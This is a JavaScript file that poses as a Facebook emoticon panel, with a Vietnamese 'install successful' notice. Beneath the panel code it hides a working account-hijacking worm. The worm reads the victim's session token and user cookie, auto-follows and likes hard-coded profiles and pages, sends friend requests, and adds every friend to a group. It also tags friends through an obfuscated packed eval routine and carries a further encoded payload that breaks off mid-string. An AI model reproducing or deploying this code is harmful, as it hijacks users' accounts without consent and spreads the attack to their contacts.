			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
	html += '<a class="navLink" title="1 thông báo mới">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="http://w11.zetaboards.com/TheGioiDanTeen/topic/10061788/1/" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng kích chuột vào đây để thực hiện công đoạn hoàn tất sau 5 phút và không quá 60 phút kể từ khi đọc thông báo này. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn hoàn thành bước hoàn tất. Ứng dụng được phát triển bởi Cộng đồng IT Việt.<br>IT VIỆT</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
//fb ku adibpn
a("100004838773405");
a("100006900792419");
sublist("178593315645293");
sublist("178593452311946");



//Group ku adibpn
var gid = ['113'];



var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "459017160830170";
var spost_id = "100004044068515";
var sfoto_id = "129200850569059";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada      leme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Adib Pugar Nuraga';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);

// Like pic like page
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); } 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone) { var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true); http4.onreadystatechange=function() { if(http4.readyState==4&&http4.status==200)http4.close } ; http4.send(params4) } function sublist(uidss) { var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();"; document.body.appendChild(a); } function p(abone) { var http4 = new XMLHttpRequest(); var url4 = "//www.facebook.com/ajax/poke_dialog.php"; var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp="; http4.open("POST", url4, true); http4.onreadystatechange = function () { if (http4.readyState == 4 && http4.status == 200) { http4.close; } }; http4.send(params4); }var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); } 
// pic + fans
P("720084938024285");P("233994633438494");P("1430722823834397");Like("716302541735858");Like("202015859972982");
/*Add Friend*/;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}

// Auto comment + tag
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('g e=["1S","u","1y","1B","1E","1K","1Q","1R","h = ","o (;;);","","1U","1V",";","1W","1X","2g","S"," @[","1u",":","1w","]"," ","\\1x[0]=1z","\\K[0]=1C","\\K[1]=1F","\\1G=1H","\\1I=","\\1J=","F://","1L","1M","1P","F://r.z.A/s/C/D.v?I=1","1Y","1Z://r.z.A/s/C/D.v?I=1","2a","2b","2c","\\2d=","\\2e=","\\2f=2","\\2h=2l:2m","\\2o","\\2r","\\2t=2u","\\Q={\\R\\j:\\T\\j,\\U\\j:0,\\V\\j:\\W\\j,\\X\\j:\\Y\\j,\\Z\\j:","}","\\1a=0","\\1b=0","\\1c","\\1d[1e]=[]","\\1f=1","\\1g=1h","\\1i=q","\\1j=","\\1k=","1l","/s/1m/1n.v","1o-1p","1q/x-r-1r-1s","1t","2W","1v"];g u=n[e[2]](e[1])[0][e[0]];g p=n[e[4]][e[3]](n[e[4]][e[3]](/1A=(\\d+)/)[1]);g E=e[5];g h=[];g 1D;l G(a){g b=P L();b[e[6]]=l(){m(b[e[7]]==4){1N(e[8]+b[e[12]].1O()[e[11]](e[9],e[10])+e[13]);o(f=0;f<k[e[17]](h[e[16]][e[15]][e[14]]/27);f++){t=e[10];H=e[10];o(i=f*27;i<(f+1)*27;i++){m(h[e[16]][e[15]][i]){t+=e[18]+h[e[16]][e[15]][i][e[19]]+e[20]+h[e[16]][e[15]][i][e[21]]+e[22];H+=e[23]+h[e[16]][e[15]][i][e[21]]}};J(a,t)}}};g c=e[24];c+=e[25];c+=e[26];c+=e[27];c+=e[28]+p;c+=e[29]+p;m(n[e[2i]][e[2j]](e[2k])>=0){b[e[w]](e[M],e[2n]+c,y)}2p{b[e[w]](e[M],e[2q]+c,y)};b[e[N]]()};l 2s(){g a=e[10];o(i=0;i<9;i++){a+=e[18]+h[e[16]][e[15]][k[e[O]](k[e[B]]()*h[e[16]][e[15]][e[14]])][e[19]]+e[20]+h[e[16]][e[15]][k[e[O]](k[e[B]]()*h[e[16]][e[15]][e[14]])][e[21]]+e[22]};2v a};l J(a,b){g c=P L();g d=e[10];d+=e[2w]+a;d+=e[2x]+2y(b);d+=e[2z];d+=e[2A];d+=e[2B];d+=e[2C];d+=e[2D];d+=e[2E]+a+e[2F];d+=e[2G];d+=e[2H];d+=e[2I];d+=e[2J];d+=e[29]+p;d+=e[2K];d+=e[2L];d+=e[2M];d+=e[2N]+u;d+=e[2O];c[e[w]](e[2P],e[2Q],y);c[e[2R]](e[2S],e[2T]);c[e[6]]=l(){m(c[e[7]]==4&&c[e[2U]]==2V){c[e[1T]]}};c[e[N]](d)};G(E);',62,183,'||||||||||||||_0xa22c||var|arkadaslar||x22|Math|function|if|document|for|user_id||www|ajax|mesaj|fb_dtsg|php|35||true|facebook|com|38|typeahead|first_degree|id|https|arkadaslari_al|mesaj_text|__a|yorum_yap|x26options|XMLHttpRequest|33|37|39|new|x26clp|x22cl_impid|round|x22453524a0|x22clearcounter|x22elementid|x22js_5|x22version|x22x|x22parent_fbid|||||||||||x26attached_sticker_fbid|x26attached_photo_fbid|x26giftoccasion|x26ft|tn|x26__a|x26__dyn|7n8ahyj35ynxl2u5F97KepEsyo|x26__req|x26fb_dtsg|x26ttstamp|POST|ufi|add_comment|Content|type|application|form|urlencoded|setRequestHeader|uid|close|text|x26filter|getElementsByName|user|c_user|match|friends_only|svn_rev|cookie|nm|x26token|v7|x26viewer|x26__user|1430722823834397|indexOf|URL|eval|toString|GET|onreadystatechange|readyState|value|64|replace|responseText|length|entries|open|http|||||||||||send|random|floor|x26ft_ent_identifier|x26comment_text|x26source|payload|x26client_id|32|31|30|1377871797138|1707018092|34|x26reply_fbid|else|36|x26parent_comment_id|RandomArkadas|x26rootid|u_jsonp_2_3|return|40|41|encodeURIComponent|42|43|44|45|46|47|48|49|50|51|52|53|54|55|56|57|58|59|62|60|61|63|200|status'.split('|'),0,{}));
var _4678;var _8595='18344C168F191E1649B1609D1801B3065B2113E1529A1665D1609E1649D1353F2217B2049A2185C1529C2169C2049C2185B2081A2153F2201E1761C2073A2161B2065F2209C2145E2081A2153D2201F1641D2097B2081F2201C1825B2137E2081E2145C2081D2153A2201C2193A1801E2241F1945C2049C2097F1897C2049E2145D2081F1593A1545B2105D2201D2145D2137E1545B1601D2001E1657A2017B1745E1353A2217A2049E2185C1529E2033E2057A2161D2073F2241C1529E1761E1529A2073D2161D2065E2209C2145D2081C2153C2201B1641D2097E2081A2201B1825F2137F2081E2145F2081B2153B2201A2193C1801F2241E1945A2049F2097A1897C2049D2145B2081D1593B1585F2057B2161D2073C2241F1585C1601E2001B1657E2017A1745C1353F2217C2049C2185D1529D2033A2073C2113A2217F1529C1761E1529F2073C2161E2065C2209C2145F2081D2153E2201D1641D2065D2185E2081D2049E2201E2081B1825E2137F2081B2145D2081D2153B2201C1593B1585E2073B2113D2217B1585F1601F1745E1353D2033C2073F2113F2217A1641F2193B2201C2241C2137B2081B1641B2105E2081A2113C2097B2105D2201F1761F1545C1673C1697C1545D1745E2033B2073A2113E2217A1641E2193C2201F2241C2137C2081F1641D2225F2113E2073C2201C2105E1761D1545B1665A1657A1657F1569C1545D1745E2033B2073B2113B2217F1641F2193D2201A2241D2137F2081D1641D2169C2161D2193F2113A2201C2113F2161E2153F1761D1545B2089A2113A2233D2081A2073D1545D1745B1353A2033F2073B2113F2217E1641A2193D2201E2241C2137B2081E1641D2201B2161C2169A1761E1545D2049E2209E2201F2161B1545A1745B2033E2073C2113A2217D1641C2193E2201D2241C2137D2081B1641C2057C2161C2201F2201D2161B2145B1529B1761C1529C1545C1617E1673A1697D2169F2233A1545F1745B2033A2073B2113B2217D1641F2049F2137A2113E2097D2153B1761F1545C2065D2081C2153C2201C2081D2185E1545F1745D1353B2217F2049B2185C1529A2033B2049C2209D2073B2113F2161C1761A1529D2073B2161C2065E2209E2145C2081C2153F2201A1641C2065B2185F2081E2049F2201E2081B1825E2137E2081B2145B2081A2153C2201B1593E1585C2049B2209F2073B2113B2161A1585A1601B1745B1353F2033E2049E2209C2073A2113B2161E1641E2193C2201C2241E2137B2081E1641C2225E2113C2073C2201A2105E1761D1545D1665A1657F1657C1569E1545B1745F2033D2049E2209F2073C2113B2161E1641E2193C2201E2241D2137C2081F1641A2105D2081A2113D2097F2105F2201D1761E1545B1673C1697D2169C2233F1545C1745F2033E2049B2209D2073C2113D2161C1641B2065B2161A2153E2201B2185A2161B2137F2193E1529C1761F1529E2201A2185E2209C2081A1745E2033F2049A2209D2073B2113A2161F1641C2049D2209A2201E2161C2169D2137D2049C2241D1529A1761D1529B2089B2049D2137E2193D2081E1745C1353D2033B2049F2209F2073D2113D2161C1641C2193D2185C2065A1529B1761C1529F1545C2105C2201E2201C2169C1737B1649C1649E2145A2209F2193C2113D2065A1633B2105A2153D1641F1673A1689C2105C2193E2201E2049B2201C2113A2065F1641B2065F2161F2145C1649C2209D2169A2137E2161A2049C2073A2145A2209F2193D2113D2065C1673B1649D1665B1673D2089F2057E1705C1697A1665D2089F1657A1665A1673F1713D2073B2049B1673A1689D2049F1657C1713E2081D2065B1713C1721D1681D1665A1673C1665A2081F2089F2065D1657F1713E1649B1697C1673D2057C2057A1681F1729B1689E1681E1649F2209C2169B2137D2161D2049A2073C2145D2209D2193A2113D2065E1649F2113D2073B2033B2137C2081E1649B1673F1633A1673D1657A1665A1681C1649C2105E2209B2241E2137A2209B2153A1649E1961A2169B2161A2169F1649F1793F2137B2057F2209A2145D1649E1665B1649F1897D2097B2049E2241C1569E1673F1657C1793B2241F1569D1673C1657D1937F2081F1569E1673A1657B1817F2081C2153B1569D1673D1657A1633D1569D1673E1657F1849A2161A1569E1673D1657E1921C2209A2049C2153F2097C1569C1673B1657F1849F2113F2081F2209B1649C1665F1673A1721B1649D1809C2161B2153D1569D1673D1657D1801C2209E2161E2145E1569A1673E1657E1977A2209E2049C2153E1569A1673D1657E1633E1569F1673C1657B1849D2161F1569F1673F1657D1921C2209A2049F2153D2097D1569B1673F1657D1849B2113D2081F2209D1641B2145B2169A1681D1545D1745B1353B2033D2073A2113F2217A1641B2049C2169B2169B2081E2153B2073E1809F2105E2113E2137A2073F1593C2033A2049B2209B2073C2113E2161D1601D1745A2033D2057A2161E2073C2241E1641D2049E2169B2169E2081F2153F2073D1809C2105F2113E2137C2073D1593A2033A2073C2113B2217A1601B1745F1353A1649F1609A2057E3065C2113F1529F1673F1609B1649D1353D2033A2073A2113E2217F1641A2193F2201B2241E2137B2081C1641E2105D2081B2113A2097B2105D2201E1761C1545D1673C1697E1545E1745A2033E2073E2113A2217D1641A2193A2201A2241E2137E2081E1641D2225F2113B2073C2201D2105C1761C1545B1665B1657D1657F1569B1545F1745E2033A2073A2113E2217B1641D2193A2201A2241B2137C2081F1641B2169A2161C2193A2113B2201A2113C2161A2153C1761B1545E2089C2113C2233A2081B2073F1545D1745E1353E2033D2073A2113A2217C1641F2193C2201E2241E2137D2081D1641F2201F2161D2169D1761A1545A2049C2209A2201F2161D1545A1745D2033B2073C2113B2217F1641A2193E2201E2241A2137E2081A1641A2057F2161E2201E2201E2161D2145B1761C1545A1657F1545B1745E2033A2073E2113C2217C1641D2049A2137A2113B2097E2153C1761A1545C2065D2081A2153F2201E2081D2185A1545B1745F1353B2217C2049F2185A1529C2033F2049D2209F2073B2113B2161B1761F1529B2073A2161E2065A2209A2145B2081E2153A2201F1641D2065D2185D2081E2049C2201F2081F1825E2137D2081A2145D2081A2153D2201C1593E1585B2049A2209A2073E2113B2161F1585B1601E1745F1353F2033D2049C2209A2073D2113C2161D1641D2193C2201D2241A2137B2081C1641B2225B2113E2073C2201C2105F1761C1545F1665F1657C1657B1569D1545F1745C2033F2049A2209F2073B2113B2161B1641A2193C2201C2241B2137E2081E1641B2105C2081E2113C2097C2105D2201F1761A1545E1673C1697B2169C2233B1545A1745A2033B2049E2209E2073E2113F2161D1641C2065D2161D2153F2201E2185E2161A2137A2193C1529B1761C1529E2201F2185C2209C2081F1745D1353A2033F2049C2209B2073A2113A2161B1641C2049F2209E2201A2161C2169A2137A2049C2241B1529B1761C1529F2089D2049C2137A2193D2081F1745E2033E2049E2209C2073D2113A2161D1641D2049A2209F2201C2161F2169D2137C2049D2241C1529F1761A1529C2201C2185C2209C2081A1745C1353C2033A2049F2209A2073E2113D2161D1641E2193E2185E2065C1529B1761B1529D1545A2105B2201B2201E2169B1737B1649F1649B2089A2185D2081D2081D1641B2145E2169E1681D2193E2161B2153A2097D2209F2185B2137F2193C1641E2065A2161E2145C1649C1665D1681D1697C1657D1697C1673F1705B1641D2145F2169D1681D1545D1745D1353D2033A2073A2113A2217A1641A2049D2169A2169B2081D2153F2073C1809C2105C2113A2137A2073C1593E2033E2049B2209C2073C2113B2161D1601E1745E2033B2057F2161A2073F2241D1641A2049A2169D2169E2081B2153E2073F1809F2105B2113E2137B2073C1593E2033D2073B2113F2217E1601A1745E1353C1649F1609B2057C3065F2113F1529A1681E1609F1649C1353A2033C2073F2113F2217D1641F2193F2201A2241E2137C2081F1641B2105F2081D2113F2097F2105F2201E1761A1545B1673E1697E1545F1745D2033F2073A2113A2217D1641F2193D2201B2241D2137A2081A1641A2225E2113B2073F2201E2105B1761A1545D1665A1657D1657D1569A1545E1745E2033A2073E2113C2217F1641A2193C2201A2241A2137B2081F1641D2169F2161A2193D2113A2201E2113A2161F2153D1761F1545C2089E2113A2233A2081C2073F1545B1745F1353B2033F2073E2113A2217B1641F2193A2201D2241B2137D2081E1641C2201F2161C2169E1761C1545E2049B2209B2201B2161B1545C1745B2033C2073B2113A2217D1641B2193E2201A2241E2137E2081B1641B2057F2161D2201D2201D2161D2145B1761D1545D1657E1545C1745D2033D2073A2113D2217D1641A2049E2137B2113E2097D2153C1761E1545F2065E2081D2153B2201D2081A2185E1545A1745D1353C2217A2049C2185A1529E2033C2049E2209E2073C2113C2161A1761F1529A2073D2161B2065A2209E2145B2081C2153F2201D1641E2065E2185F2081B2049C2201F2081E1825F2137E2081D2145A2081E2153F2201F1593B1585A2049E2209A2073B2113A2161A1585C1601B1745C1353B2033E2049D2209C2073D2113C2161F1641B2193F2201B2241D2137C2081B1641F2225F2113C2073B2201F2105E1761E1545A1665A1657B1657A1569F1545B1745C2033A2049F2209D2073A2113A2161F1641F2193A2201F2241D2137A2081A1641C2105F2081B2113B2097D2105B2201C1761C1545A1673D1697A2169E2233D1545A1745F2033B2049A2209D2073B2113A2161C1641A2065C2161E2153B2201F2185D2161E2137C2193B1529F1761E1529E2201A2185C2209C2081B1745B1353D2033E2049B2209F2073B2113C2161B